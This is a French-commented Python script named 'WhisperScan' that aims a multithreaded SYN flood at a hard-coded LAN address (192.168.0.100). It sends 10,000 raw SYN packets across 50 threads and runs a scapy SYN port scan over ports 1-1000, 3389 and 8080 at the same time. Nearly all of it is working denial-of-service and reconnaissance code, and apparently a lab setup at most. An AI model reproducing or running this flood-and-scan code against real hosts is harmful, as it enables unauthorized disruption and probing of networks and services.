#!/usr/bin/env python3
import socket
import random
import asyncio
from scapy.all import IP, TCP, sr1, RandShort, raw, conf  # MODIF: import conf ici
from struct import pack, unpack
from threading import Thread
import logging
from datetime import datetime
import sys
import netifaces  # MODIF: import netifaces pour détection interface


# -------------------
# Initialisation logging
# -------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('portscan_detectable.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("MassiveScan")

# -------------------
# Version & Info
# -------------------
VERSION = "1.1"
REQUIRED_OS = "linux"

if not sys.platform.startswith(REQUIRED_OS):
    print(f"[ERREUR] Ce script ne fonctionne que sous Linux. (OS détecté: {sys.platform})")
    sys.exit(1)



# -------------------
# Configuration réseau auto
# -------------------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return "192.168.0.108"  # Fallback si la détection échoue

# --- MODIF ---
def get_active_interface(default_iface="wlp2s0"):
    try:
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                ip = addrs[netifaces.AF_INET][0]['addr']
                if not ip.startswith("127."):
                    return iface
        return default_iface
    except Exception as e:
        return default_iface

TARGET_IP = "192.168.0.100"
SOURCE_IP = get_local_ip()  # Auto-détection de l'IP

INTERFACE = get_active_interface()

TARGET_PORTS = list(range(1, 1001)) + [3389, 8080]
TOTAL_PACKETS = 10000
THREADS = 50
TIMEOUT = 2

# -------------------
# Structures de données
# -------------------
results = {
    'open_ports': set(),
    'closed_ports': set(),
    'start_time': None,
    'end_time': None,
    'packets_sent': 0,
    'packets_errors': 0,  # MODIF: compteur erreurs ajouté
    'thread_packets': {},
    'thread_progress': {},
    'thread_start': {},
    'thread_end': {},
}


# -------------------
# Partie 1: Flood SYN massif
# -------------------
def syn_flood():
    """Envoi massif de paquets SYN sans écoute"""
    results['packets_sent'] = 0  # MODIF: reset compteur avant flood
    results['packets_errors'] = 0  # MODIF: reset compteur erreurs

    def sender_thread(thread_id):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            packets_to_send = TOTAL_PACKETS // THREADS
            results['thread_packets'][thread_id] = 0
            results['thread_start'][thread_id] = datetime.now()
            
            for i in range(packets_to_send):
                packet = IP(
                    src=SOURCE_IP,
                    dst=TARGET_IP,
                    id=12345,
                    ttl=64
                ) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice(TARGET_PORTS),
                    flags="S",
                    window=8192
                )
                try:  # MODIF: gestion d'erreur envoi paquet
                    s.sendto(raw(packet), (TARGET_IP, 0))
                    results['packets_sent'] += 1
                    results['thread_packets'][thread_id] += 1
                except Exception as e:
                    results['packets_errors'] += 1
                    logger.error(f"[Thread {thread_id}] Erreur envoi paquet {i+1}: {e}")

                if (i+1) % 200 == 0 or (i+1) == packets_to_send:
                    logger.info(f"[Thread {thread_id}] Paquets envoyés: {i+1}/{packets_to_send}")
                    
            results['thread_end'][thread_id] = datetime.now()
            s.close()
        except Exception as e:
            logger.error(f"Erreur thread {thread_id}: {e}")

    logger.info(f"[FLOOD] Lancement du SYN flood depuis {SOURCE_IP} sur {THREADS} threads")
    threads = [Thread(target=sender_thread, args=(tid+1,)) for tid in range(THREADS)]
    for t in threads: t.start()
    for t in threads: t.join()
    logger.info(f"[FLOOD] SYN flood terminé - {results['packets_sent']} paquets envoyés")

# -------------------
# Partie 2: Scan précis
# -------------------
async def precise_scan():
    """Scan des ports avec analyse des réponses"""
    async def scan_port(port):
        try:
            pkt = IP(dst=TARGET_IP)/TCP(sport=RandShort(), dport=port, flags="S")
            response = await asyncio.to_thread(sr1, pkt, timeout=TIMEOUT, verbose=0)
            if response and response.haslayer(TCP):
                if response[TCP].flags & 0x12:  # SYN-ACK
                    results['open_ports'].add(port)
                elif response[TCP].flags & 0x14:  # RST
                    results['closed_ports'].add(port)
                else:
                    pass
            else:
                results['closed_ports'].add(port)
        except Exception as e:
            logger.warning(f"Erreur sur le port {port}: {e}")
    await asyncio.gather(*[scan_port(p) for p in TARGET_PORTS])

# -------------------
# Fonction principale
# -------------------
async def main():
    # --- En tête & démarrage du scan ---
    logger.info("="*30)
    logger.info(f"WhisperScan v{VERSION} - (c) 2024 - Compatible uniquement Linux")
    logger.info(f"Démarrage du script à {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info("="*30)
    logger.info(f"--- DÉMARRAGE DU SCAN VERS {TARGET_IP} ---")
    logger.info(f"Cible: {TARGET_IP} | Ports: {len(TARGET_PORTS)} | Threads flood: {THREADS} | Paquets flood: {TOTAL_PACKETS}")
    logger.info(f"[IP] Adresse IP source détectée: {SOURCE_IP}")
    logger.info(f"[IFACE] Interface réseau détectée automatiquement : {INTERFACE} (utilisée par Scapy)")

    # Déplacement ici de la config Scapy
    conf.iface = INTERFACE
    logger.info(f"[SCAPY] Interface forcée pour envoi des paquets : {conf.iface}")

    results['start_time'] = datetime.now()

    logger.info(f"[FLOOD] Lancement du SYN flood massif sur {THREADS} threads, {TOTAL_PACKETS} paquets à envoyer...")
    flood_thread = Thread(target=syn_flood)
    flood_thread.start()

    logger.info(f"[SCAN] Démarrage du scan précis sur {len(TARGET_PORTS)} ports...")
    await precise_scan()

    flood_thread.join()
    results['end_time'] = datetime.now()

    # Calculs
    duration = (results['end_time'] - results['start_time']).total_seconds()
    open_ports = sorted(results['open_ports'])
    closed_ports = sorted(results['closed_ports'])

    # Résultats des ports
    logger.info(f"\n{' PORTS OUVERTS ':=^50}")
    for port in open_ports:
        logger.info(f"[SCAN] Port {port} OUVERT 🟢")
    logger.info(f"\n{' PORTS FERMÉS ':=^50}")
    for port in closed_ports:
        logger.info(f"[SCAN] Port {port} FERMÉ 🔴")

    # Statistiques finales
    logger.info(f"\n{' STATISTIQUES FINALES ':=^50}")
    logger.info(f"Paquets flood envoyés: {results['packets_sent']}/{TOTAL_PACKETS}")
    logger.info(f"Paquets en erreur lors de l'envoi: {results.get('packets_errors', 0)}")  # MODIF: affichage erreurs
    logger.info(f"Durée totale: {duration:.2f} secondes")
    logger.info(f"Débit moyen: {results['packets_sent']/duration:.2f} paquets/sec")
    logger.info(f"Temps moyen par port: {duration/len(TARGET_PORTS):.4f} sec")
    logger.info(f"Threads utilisés: {THREADS}")
    logger.info(f"Ports analysés: {len(TARGET_PORTS)}")
    logger.info(f"Ports ouverts: {len(open_ports)}")
    logger.info(f"Ports fermés: {len(closed_ports)}")

    # Log de fin
    logger.info(f"\n{' FIN DU SCAN ':=^50}")
    logger.info(f"Terminé à {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info(f"Rapport complet enregistré dans portscan_detectable.log")
    logger.info(f"Script compatible Linux uniquement")
    logger.info(f"WhisperScan v{VERSION} - Merci de votre utilisation!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.warning("Scan interrompu")
    except Exception as e:
        logger.error(f"Erreur: {e}")
